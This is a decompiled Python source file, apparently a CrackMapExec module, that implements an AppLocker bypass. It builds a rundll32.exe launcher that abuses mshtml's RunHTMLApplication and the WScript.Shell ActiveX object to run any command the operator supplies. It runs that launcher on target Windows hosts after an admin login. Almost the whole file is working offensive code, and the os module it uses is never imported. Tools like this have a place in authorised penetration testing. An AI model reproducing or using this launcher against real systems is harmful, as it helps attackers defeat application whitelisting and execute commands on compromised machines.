# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/modules/rundll32_exec.py
# Compiled at: 2016-12-29 01:49:52


class CMEModule:
    """
        AppLocker bypass using rundll32 and Windows native javascript interpreter
        Module by @byt3bl33d3r

    """
    name = 'rundll32_exec'
    description = "Executes a command using rundll32 and Windows's native javascript interpreter"
    chain_support = True

    def options(self, context, module_options):
        """
            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
        """
        if 'COMMAND' not in module_options and 'CMDFILE' not in module_options:
            context.log.error('COMMAND or CMDFILE options are required!')
            exit(1)
        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
            exit(1)
        if 'COMMAND' in module_options:
            self.command = module_options['COMMAND']
        elif 'CMDFILE' in module_options:
            path = os.path.expanduser(module_options['CMDFILE'])
            if not os.path.exists(path):
                context.log.error('Path to CMDFILE invalid!')
                exit(1)
            with open(path, 'r') as (cmdfile):
                self.command = cmdfile.read().strip()

    def launcher(self, context, command):
        command = command.replace('\\', '\\\\')
        command = command.replace('"', '\\"')
        command = command.replace("'", "\\'")
        launcher = ('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("{}");').format(command)
        return launcher

    def payload(self, context, command):
        pass

    def on_admin_login(self, context, connection, launcher, payload):
        connection.execute(launcher)
        context.log.success('Executed command')